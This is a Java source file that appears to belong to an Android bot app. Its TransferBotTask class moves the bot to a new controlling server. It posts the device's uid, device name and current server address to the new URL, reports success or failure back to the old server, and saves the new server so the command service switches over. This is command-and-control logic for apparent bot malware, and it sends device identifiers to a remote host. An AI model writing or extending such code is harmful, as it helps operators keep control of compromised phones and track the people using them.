package com.android.adobot.tasks;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.android.adobot.CommandService;
import com.android.adobot.Constants;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpCallback;
import com.android.adobot.http.HttpRequest;

import java.util.HashMap;

/**
 * Created by adones on 2/26/17.
 */

public class TransferBotTask extends BaseTask {

    private static final String TAG = "TransferBotTask";

    private String newServerUrl;
    private CommandService commandService;
    SharedPreferences prefs;

    public TransferBotTask(CommandService c, String url) {
        setContext(c);
        this.commandService = c;
        this.newServerUrl = url;
    }

    private HttpCallback pingCb = new HttpCallback() {
        @Override
        public void onResponse(HashMap response) {
            int statusCode = Integer.parseInt(String.valueOf(response.get("status")));
            Log.i(TAG, "Ping call back!!! Status code: " + statusCode);
            HashMap p = new HashMap();
            p.put("uid", commonParams.getUid());
            p.put("device", commonParams.getDevice());
            p.put("server", newServerUrl);
            p.put("status", statusCode);
            if (statusCode >= 200 && statusCode < 400) {
//                new server is reachable
//                notify old server
                sendNotification("transferbot:success", p);
                prefs = context.getSharedPreferences(Constants.PACKAGE_NAME, Context.MODE_PRIVATE);
                boolean saved = prefs.edit().putString(Constants.PREF_SERVER_URL_FIELD, newServerUrl).commit();
                Log.i(TAG, "Saved: " + (saved? "true" : "false"));
                if (saved)
                    commandService.changeServer(newServerUrl);
                else
                    sendNotification("transferbot:failed", p);
            } else {
                sendNotification("transferbot:failed", p);
            }

        }
    };

    @Override
    public void run() {
        super.run();
        pingNewServer();
    }

    private void pingNewServer() {
        HashMap p = new HashMap();
        p.put("event", "bot:transferring");
        p.put("uid", commonParams.getUid());
        p.put("device", commonParams.getDevice());
        p.put("server", commonParams.getServer());

        //ping server before transferring bot
        Http req = new Http();
        req.setUrl(newServerUrl + Constants.NOTIFY_URL);
        req.setMethod(HttpRequest.METHOD_POST);
        req.setParams(p);
        req.setCallback(pingCb);
        req.execute();

    }
}
